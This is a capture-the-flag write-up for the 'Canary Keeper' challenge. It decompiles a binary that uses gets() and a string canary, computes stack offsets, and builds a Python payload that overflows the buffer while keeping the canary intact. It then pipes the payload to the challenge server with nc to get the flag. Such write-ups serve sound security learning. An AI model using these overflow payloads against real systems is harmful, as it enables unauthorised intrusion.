# Canary Keeper
We are given a binary `provided` that asks for our input giving it some random letters gives  
> No changes in flag detected!
Opeinig it up in BinaryNinja gives:  
```C
00001203  int32_t main(int32_t argc, char** argv, char** envp)

00001203  {
00001212      int64_t var_48;
00001212      __builtin_strncpy(&var_48, "FLAG", 0x40);
00001252      int32_t var_4f;
00001252      __builtin_strncpy(&var_4f, "canary", 7);
0000126f      printf("Enter a string: ");
00001283      void buf;
00001283      gets(&buf);
00001296      int32_t rax_3;
00001296      if (check_canary(&var_4f) == 0)
00001296      {
0000129f          puts("Buffer overflow detected!");
000012a4          rax_3 = 1;
00001296      }
00001296      else if (check_flag(&var_48) == 0)
000012b9      {
000012e1          printf("Flag: %s\n", "FLAG");
000012e6          rax_3 = 0;
000012b9      }
000012b9      else
000012b9      {
000012c2          puts("No changes in flag detected!");
000012c7          rax_3 = 1;
000012b9      }
000012ec      return rax_3;
00001203  }
```
Let's look at the `check_canary` function:
```C
000011a9  uint64_t check_canary(char* arg1)

000011a9  {
000011ce      int32_t rax_1;
000011ce      rax_1 = strcmp(arg1, "canary") == 0;
000011d5      return ((uint64_t)rax_1);
000011a9  }
```
So our canary is "canary".  
what about `check_flag`?
```C
000011d6  uint64_t check_flag(char* arg1)

000011d6  {
000011fb      int32_t rax_1;
000011fb      rax_1 = strcmp(arg1, "FLAG") == 0;
00001202      return ((uint64_t)rax_1);
000011d6  }
```
So We modify the variable var_48 so that it fails the `check_flag` check, but without changing the canary.

Now let's think about our stack layout:  
checking out the offset of each variable we can conclude: 
```
-0x48 var_48 (the "flag" we want to change)
-0x4f var_4f (our canary)
-0x98 buf
```
so the offset between our buffer and our canary is 73 bytes.

We can make a simple payload with python (no need for pwntools):  
```python3 -c "print('A'*73+'canary\x00'+'newvalue')"```  
We added a null byte(`\x00`) to end our canary string so that the `strcmp` in `check_canary` stops the comparison there.  
let's save our payload to a file:  
```python3 -c "print('A'*73+'canary\x00'+'newvalue')" > payload```  
And now we redirect it to the server:  
```nc challs.bcactf.com 32101 < payload```  
We have our flag:
> bcactf{s1mple_CANaRY_9b36bd9f3fd2f}
